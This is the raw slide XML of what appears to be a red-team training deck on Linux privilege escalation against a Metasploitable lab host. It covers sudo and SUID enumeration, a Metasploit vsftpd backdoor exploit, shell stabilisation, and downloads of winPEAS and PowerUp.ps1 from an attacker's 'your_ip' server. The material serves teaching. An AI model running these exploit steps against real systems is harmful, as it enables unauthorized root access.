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307" r:id="rId3"/>
    <p:sldId id="258" r:id="rId4"/>
    <p:sldId id="259" r:id="rId5"/>
    <p:sldId id="257" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="285" r:id="rId8"/>
    <p:sldId id="261" r:id="rId9"/>
    <p:sldId id="265" r:id="rId10"/>
    <p:sldId id="266" r:id="rId11"/>
    <p:sldId id="262" r:id="rId12"/>
    <p:sldId id="264" r:id="rId13"/>
    <p:sldId id="267" r:id="rId14"/>
    <p:sldId id="268" r:id="rId15"/>
    <p:sldId id="310" r:id="rId16"/>
    <p:sldId id="269" r:id="rId17"/>
    <p:sldId id="270" r:id="rId18"/>
    <p:sldId id="263" r:id="rId19"/>
    <p:sldId id="271" r:id="rId20"/>
    <p:sldId id="282" r:id="rId21"/>
    <p:sldId id="272" r:id="rId22"/>
    <p:sldId id="309" r:id="rId23"/>
    <p:sldId id="280" r:id="rId24"/>
    <p:sldId id="277" r:id="rId25"/>
    <p:sldId id="281" r:id="rId26"/>
    <p:sldId id="283" r:id="rId27"/>
    <p:sldId id="278" r:id="rId28"/>
    <p:sldId id="289" r:id="rId29"/>
    <p:sldId id="290" r:id="rId30"/>
    <p:sldId id="279" r:id="rId31"/>
    <p:sldId id="287" r:id="rId32"/>
    <p:sldId id="288" r:id="rId33"/>
    <p:sldId id="273" r:id="rId34"/>
    <p:sldId id="274" r:id="rId35"/>
    <p:sldId id="291" r:id="rId36"/>
    <p:sldId id="296" r:id="rId37"/>
    <p:sldId id="293" r:id="rId38"/>
    <p:sldId id="292" r:id="rId39"/>
    <p:sldId id="294" r:id="rId40"/>
    <p:sldId id="297" r:id="rId41"/>
    <p:sldId id="298" r:id="rId42"/>
    <p:sldId id="299" r:id="rId43"/>
    <p:sldId id="303" r:id="rId44"/>
    <p:sldId id="302" r:id="rId45"/>
    <p:sldId id="301" r:id="rId46"/>
    <p:sldId id="30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12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44" autoAdjust="0"/>
    <p:restoredTop sz="94343" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="100" d="100"/>
          <a:sy n="100" d="100"/>
        </p:scale>
        <p:origin x="96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D84D51-AFC7-4011-9B24-6F1C6B76D366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ED0C1-B538-4301-988D-F8688934E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6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ED0C1-B538-4301-988D-F8688934E6E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54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ED0C1-B538-4301-988D-F8688934E6E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08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ED0C1-B538-4301-988D-F8688934E6E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91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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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41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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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33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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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55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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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74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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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9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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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14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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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3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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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0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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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9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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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1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AA1C-D813-45F5-8E06-63986B8A69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FC0A-9425-42B1-A382-C829B3AE9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80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4AA1C-D813-45F5-8E06-63986B8A696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0FC0A-9425-42B1-A382-C829B3AE9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raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh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your_ip:8000/winPEASx64.exe%20-OutFile%20winpeas.ex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your_ip:8000/PowerUp.ps1%20-OutFile%20PowerUp.ps1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479675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Week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Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Niaz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Red Team Trainer at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Cyberster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562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675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Task 01 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>: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Linux Privilege Escalation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(The Path to Root)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26758"/>
            <a:ext cx="12192000" cy="61312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○ Description: You have a low-privilege shell (e.g., www-data). Now, you must become root.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○ Technical Requirements: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1.Manual Enumeration: Check for misconfigured SUDO rights (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -l), SUID bits (find / -perm -u=s -type f 2&gt;/dev/null), and world-writable files in /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/.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2.Automated Enumeration: Use scripts like LinPEAS.sh and LSE.sh to identify potential escalation paths.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3.Kernel Exploits: Research the OS version and identify if it's vulnerable to exploits like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>DirtyPipe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PwnKit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (Only as a last resort).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○ Learning Goal: Understand that most "hacks" happen due to poor system administration rather than complex bugs. </a:t>
            </a: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77280"/>
            <a:ext cx="65" cy="302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5392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963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7280"/>
            <a:ext cx="7994073" cy="6780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+mj-lt"/>
              </a:rPr>
              <a:t>Part1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>1.Manual Enumeration: Check for misconfigured SUDO rights</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -l), SUID bits (find / -perm -u=s -type f 2&gt;/dev/null), and </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>world-writable files in /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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B0F0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Scenario: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>You already have a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>low-privilege shell [(e.g., www-data)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+mj-lt"/>
              </a:rPr>
              <a:t> www-data is a low-privilege user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> on Linux systems] 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Weak shell → escalate to root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What is www-data?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dirty="0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www-data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>service account used by web servers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> like: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dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Apache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dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nginx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dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>When a website runs code (PHP, scripts), it executes as:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="+mj-lt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www-data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 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endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="+mj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77280"/>
            <a:ext cx="65" cy="302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5392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994073" y="-62300"/>
            <a:ext cx="3962400" cy="419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solidFill>
                  <a:srgbClr val="0070C0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What (www-data) CAN do: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latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Read website files (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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lang="en-US" altLang="en-US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var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>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latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Execute web application code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latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Handle HTTP requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"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solidFill>
                  <a:srgbClr val="1F4D78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What  CANNOT do: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latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Access sensitive files like:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:latin typeface="+mj-lt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lang="en-US" altLang="en-US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etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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/shadow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:latin typeface="+mj-lt"/>
              <a:ea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latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Install system packages</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"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latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Modify system configurations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latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Access other users’ private data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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3663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99588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+mj-lt"/>
              </a:rPr>
              <a:t>Initial access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+mj-lt"/>
              </a:rPr>
              <a:t>Phase 0 — Stabilize Shell (if needed)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</a:rPr>
              <a:t>Before anything, make your shell usable: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rgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>python -c 'import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>pty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>pty.spawn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>("/bin/bash")'</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>export TERM=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>xterm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Step 1 — Gain a Low-Privilege Shell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Get a shell on Metasploitable through its vulnerable services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1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msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
              <a:latin typeface="+mj-lt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use exploit/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1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unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0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/ftp/vsftpd_234_backdoor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Set Target IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
              <a:latin typeface="+mj-lt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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0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RHOST &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1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metasploitable-ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0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en-US" sz="20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Set the attacker IP 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set LHOST &lt;your-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1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ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0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show options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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1527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056909" cy="6610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  <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>exploit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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>su</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> www-data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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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  <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>python -c 'import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>pty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>pty.spawn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>("/bin/bash")'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This will give a shell like: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0000"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>root@metasploitable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:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Manual Enumeration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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Check Current User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First confirm the current user.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Inside the shell run:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>whoami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Example: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www-data      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sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>This means you are a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>low-privilege user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"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611092" y="155139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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Linux Privilege Escalation — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" i="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>From www-data → root</a:t>
            </a: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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 2 — Confirm Your Current User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Check What commands can this current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user run as another user (usually root)?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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -l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Example vulnerable output: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User www-data may run the following commands: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(root) NOPASSWD: /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/bin/vim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If a program can run as root,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it may allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>privilege escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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3912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1"/>
            <a:ext cx="12192000" cy="692467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+mj-lt"/>
              </a:rPr>
              <a:t>Step 3 — Search for SUID Files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+mj-lt"/>
              </a:rPr>
              <a:t>SUID = Set User ID</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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+mj-lt"/>
              </a:rPr>
              <a:t>👉 It’s a special permission on a file that means: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+mj-lt"/>
              </a:rPr>
              <a:t>“When this file is executed, it runs with the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>permissions of the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+mj-lt"/>
              </a:rPr>
              <a:t> file owner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>, not the user running it.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"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+mj-lt"/>
              </a:rPr>
              <a:t>SUID binaries run with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>root privileges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt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find</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> /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-perm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>-u=s -type f 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>&gt;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/dev/null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+mj-lt"/>
              </a:rPr>
              <a:t>Look for interesting binaries like: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+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"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+mj-lt"/>
              </a:rPr>
              <a:t>Misconfigured SUID programs can be abused to obtain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>root access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>In the output, focus on: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sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/usr/bin/nmap</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/usr/bin/passwd</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/usr/bin/sudo</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/usr/bin/chsh</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="de-DE" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/usr/bin/newgrp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0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41725"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7196154" y="137802"/>
            <a:ext cx="4306529" cy="658239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3788229" y="3831771"/>
            <a:ext cx="3526971" cy="228602"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="50800">
            <a:solidFill>
              <a:srgbClr val="B6126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477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1"/>
            <a:ext cx="10991850" cy="6924676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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Key Target → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0">
